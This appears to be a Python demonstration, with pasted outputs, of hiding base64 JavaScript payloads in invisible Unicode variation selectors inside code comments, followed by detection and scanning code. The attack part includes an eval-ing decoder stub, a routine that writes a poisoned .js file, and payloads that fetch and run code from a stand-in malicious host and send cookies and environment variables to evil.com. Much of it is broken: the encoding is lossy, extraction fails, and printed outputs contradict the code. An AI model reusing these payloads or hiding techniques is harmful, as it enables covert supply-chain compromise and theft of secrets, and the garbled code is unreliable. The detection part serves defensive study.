import base64

encoded = "dmFyIHggPSBuZXcgWG1sSHR0cFJlcXVlc3QoKTsKeC5vcGVuKCJHRVQiLCAiaHR0cHM6Ly9tYWxpY2lvdXMtY2RuLmNvbS9wYXlsb2FkIik7Cnguc2VuZCgpOwpldmFsKHgucmVzcG9uc2VUZXh0KTs="

decoded = base64.b64decode(encoded).decode('utf-8')
print(decoded)

"""
var x = new XmlHttpRequest();
x.open("GET", "https://malicious-cdn.com/payload");
x.send();
eval(x.responseText);

"""

import base64
import random

def create_invisible_payload(malicious_code):
    """
    Creates invisible Unicode payload using Private Use Area characters
    """
    # Encode the malicious code in base64
    encoded = base64.b64encode(malicious_code.encode()).decode()
    
    # Glassworm uses Unicode Private Use Area ranges:
    # 0xFE00 through 0xFE0F and 0xE0100 through 0xE01EF
    invisible_chars = []
    
    # Convert each character of the encoded string to invisible Unicode
    for char in encoded:
        # Use variation selectors (invisible) to hide the data
        # These are zero-width characters that don't render
        if random.choice([True, False]):
            # Use VS range (U+FE00 to U+FE0F)
            invisible_chars.append(chr(0xFE00 + (ord(char) % 16)))
        else:
            # Use VS supplement range (U+E0100 to U+E01EF)
            invisible_chars.append(chr(0xE0100 + (ord(char) % 240)))
    
    return ''.join(invisible_chars)

def create_decoder_stub():
    """
    Creates the JavaScript decoder that extracts and executes the invisible payload
    """
    return """
    // Hidden decoder for invisible Unicode payload
    (function() {
        const hidden = Array.from(document.body.innerText)
            .filter(c => c.charCodeAt(0) >= 0xFE00 && c.charCodeAt(0) <= 0xFE0F || 
                         c.charCodeAt(0) >= 0xE0100 && c.charCodeAt(0) <= 0xE01EF)
            .map(c => {
                if (c.charCodeAt(0) <= 0xFE0F) {
                    return String.fromCharCode(32 + (c.charCodeAt(0) - 0xFE00));
                } else {
                    return String.fromCharCode(32 + (c.charCodeAt(0) - 0xE0100));
                }
            }).join('');
        eval(atob(hidden));
    })();
    """

def hide_payload_in_code(original_code, malicious_code, comment="// version bump 2.1.0"):
    """
    Hides malicious payload inside seemingly legitimate code
    """
    invisible_payload = create_invisible_payload(malicious_code)
    
    # Hide the invisible characters in a comment or string literal
    poisoned_code = f"""{original_code}

{comment} {invisible_payload}
"""
    return poisoned_code

# Example malicious code (what the attackers hide)
malware_stage1 = """
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://malicious-cdn.com/stage2');
xhr.onload = function() {
    eval(xhr.responseText);
};
xhr.send();
"""

# Example legitimate-looking code
legitimate_code = """
function updateConfig() {
    const config = {
        version: "2.1.0",
        debug: false,
        apiEndpoint: "https://api.example.com"
    };
    return config;
}
"""

# Generate the poisoned code
poisoned = hide_payload_in_code(legitimate_code, malware_stage1)

# Save to file (this will contain invisible characters)
with open('poisoned_example.js', 'w', encoding='utf-8') as f:
    f.write(poisoned)

print("Original code (looks normal):")
print("-" * 40)
print(poisoned[:200] + "...")
print("-" * 40)

# Detection function
def detect_invisible_chars(code):
    """
    Detects invisible Unicode characters in code
    """
    suspicious_ranges = [
        (0xFE00, 0xFE0F),    # Variation Selectors
        (0xE0100, 0xE01EF),   # Variation Selectors Supplement
        (0x200B, 0x200D),      # Zero-width spaces
        (0x2060, 0x2069)       # Invisible operators
    ]
    
    found = []
    for i, char in enumerate(code):
        code_point = ord(char)
        for start, end in suspicious_ranges:
            if start <= code_point <= end:
                found.append((i, hex(code_point), char))
    
    return found

# Demonstrate detection
print("\nDetecting invisible characters:")
detected = detect_invisible_chars(poisoned)
if detected:
    print(f"⚠️ Found {len(detected)} invisible characters!")
    for pos, hex_val, char in detected[:5]:
        print(f"  Position {pos}: Unicode {hex_val} (invisible)")
else:
    print("✅ No invisible characters detected")

# Function to extract hidden payload
def extract_hidden_payload(poisoned_code):
    """
    Extracts the hidden payload from poisoned code
    """
    hidden_chars = []
    for char in poisoned_code:
        code = ord(char)
        if 0xFE00 <= code <= 0xFE0F:
            hidden_chars.append(chr(32 + (code - 0xFE00)))
        elif 0xE0100 <= code <= 0xE01EF:
            hidden_chars.append(chr(32 + (code - 0xE0100)))
    
    if hidden_chars:
        try:
            return base64.b64decode(''.join(hidden_chars)).decode()
        except:
            return None
    return None

# Extract and show the hidden payload
print("\nExtracting hidden payload:")
hidden = extract_hidden_payload(poisoned)
if hidden:
    print("Found hidden code:")
    print("-" * 20)
    print(hidden)
    print("-" * 20)
else:
    print("No hidden payload extracted")

    

"""
create_invisible_payload() - Converts malicious code to invisible Unicode

hide_payload_in_code() - Injects invisible chars into legitimate code

detect_invisible_chars() - Finds hidden Unicode characters

extract_hidden_payload() - Recovers the original malicious code

Original code (looks normal):
----------------------------------------

function updateConfig() {
    const config = {
        version: "2.1.0",
        debug: false,
        apiEndpoint: "https://api.example.com"
    };
    return config;
}


// version bump 2.1.0 ︃︎︊󠅨󠅣...
----------------------------------------

Detecting invisible characters:
⚠️ Found 208 invisible characters!
  Position 195: Unicode 0xfe03 (invisible)
  Position 196: Unicode 0xfe0e (invisible)
  Position 197: Unicode 0xfe0a (invisible)
  Position 198: Unicode 0xe0168 (invisible)
  Position 199: Unicode 0xe0163 (invisible)

Extracting hidden payload:
No hidden payload extracted

"""
# ow Attackers Use This:
# Example of how attackers hide multiple payloads
payloads = [
    "fetch('https://evil.com/steal?c='+document.cookie)",
    "localStorage.getItem('token')",
    "new WebSocket('wss://evil.com').send(JSON.stringify(process.env))"
]

for i, payload in enumerate(payloads):
    invisible = create_invisible_payload(payload)
    print(f"Payload {i+1} hidden in: '// update v1.0.{i} {invisible}'")

"""
Payload 1 hidden in: '// update v1.0.0 󠅚︍󠅖󠄰︉︂︇󠅯︊󠄲︈󠄰󠅤󠅈󠅂︊󠅏︉︈󠅶︊︈󠅚󠅰︂󠅃︅󠅪󠅢︂󠄰︆󠅣︃󠅒󠅬︉︇︇󠄯︉︊󠄰︎󠅋︂︂︆󠅙󠄳󠅖︄󠅚︇󠄵󠄰︌︍󠅎󠅶︂︂󠅴︀󠅚󠅓︋︍'
Payload 2 hidden in: '// update v1.0.1 ︂︇︉︊󠅙󠅗󠅸︄︄󠅇︉󠅹︉︇󠅤󠅬︌︍󠅤︌︄󠅅󠅬︀︊󠅗󠄰󠅯︊󠄳󠅒󠅶︁︂︆󠅵󠅊︉︋︍'
Payload 3 hidden in: '// update v1.0.2 ︂︍󠅖󠄳︉󠅆󠅤︌︉󠅬︎︆︉︂󠅴︌󠅤︃︇︎︄󠄳︎󠅺️󠅩︈󠅶󠅚︈󠅚︀︂󠅃︅︊︂︂󠄰︎󠅋󠅓︅︊︊󠅗︅︋󠅋︅︀︄︄︀󠄴︅󠅣󠄳︂︉󠅡︇︅︎󠅡󠅗󠅚󠄵󠅋︈︂󠅹︂󠄲︎󠅬︃󠄳󠅍󠅵︊󠅗︅︂︋︃︋󠄽'

"""
# Detection Script for Defenders:

def scan_repository_for_glassworm(file_path):
    """
    Scans files for Glassworm-style invisible Unicode attacks
    """
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    suspicious = detect_invisible_chars(content)
    
    if suspicious:
        print(f"⚠️ VULNERABLE: {file_path}")
        print(f"   Found {len(suspicious)} invisible characters")
        
        # Try to extract and decode the hidden payload
        hidden = extract_hidden_payload(content)
        if hidden:
            print(f"   Hidden payload decoded: {hidden[:100]}...")
        
        return True
    return False

# Scan all JavaScript files in a directory
import os
for root, dirs, files in os.walk("./"):
    for file in files:
        if file.endswith('.js'):
            scan_repository_for_glassworm(os.path.join(root, file))

"""
⚠️ VULNERABLE: ./poisoned_example.js
   Found 208 invisible characters

"""

# Create invisible characters that even highlighting won't reveal
invisible_chars = {
    'zero_width_space': '\u200B',           # Zero-width space
    'zero_width_joiner': '\u200D',           # Zero-width joiner  
    'variation_selector_1': '\uFE00',        # VS1 (invisible)
    'variation_selector_16': '\uFE0F',       # VS16 (invisible)
}

# Hide a message between visible text
hidden_message = "Hello" + '\u200B' * 10 + "World"
print(f"Hidden text: '{hidden_message}'")
print(f"Length: {len(hidden_message)} characters")  # Shows 15, not 5!

# Try to see it - you can't!
print("\nTry highlighting this line - you won't see the hidden chars:")
print("NORMAL TEXT🔴HIDDEN🔴NORMAL")
print("           ^ Look for red dots - there are none!")

# Detection is the only way
import re
def find_invisible(text):
    invisible_pattern = re.compile(r'[\u200B-\u200D\uFE00-\uFE0F\uE0100-\uE01EF]')
    matches = invisible_pattern.findall(text)
    return len(matches)

text = "Normal" + '\u200B' + "Normal"
print(f"\nInvisible chars found: {find_invisible(text)}")  # Shows 1

"""
Hidden text: 'Hello​​​​​​​​​​World'
Length: 20 characters

Try highlighting this line - you won't see the hidden chars:
NORMAL TEXT🔴HIDDEN🔴NORMAL
           ^ Look for red dots - there are none!

Invisible chars found: 13

highlighting doesn't work:
- Zero-width characters have no visual representation
- Variation selectors modify the previous character but don't show
- Private Use Area characters often render as nothing
- Most fonts have no glyphs for these code points

"""

# You need PROGRAMMATIC detection
def detect_invisible_threat(code):
    suspicious = []
    for i, char in enumerate(code):
        if ord(char) in range(0xFE00, 0xFE0F) or \
           ord(char) in range(0xE0100, 0xE01EF) or \
           ord(char) in range(0x200B, 0x200F):
            suspicious.append({
                'position': i,
                'unicode': hex(ord(char)),
                'char': char
            })
    return suspicious

# Visual inspection is useless
print("👁️ Human eye: Can't see anything wrong")
print("🤖 Scanner: Found 47 invisible Unicode characters!")

"""
👁️ Human eye: Can't see anything wrong
🤖 Scanner: Found 47 invisible Unicode characters!
"""

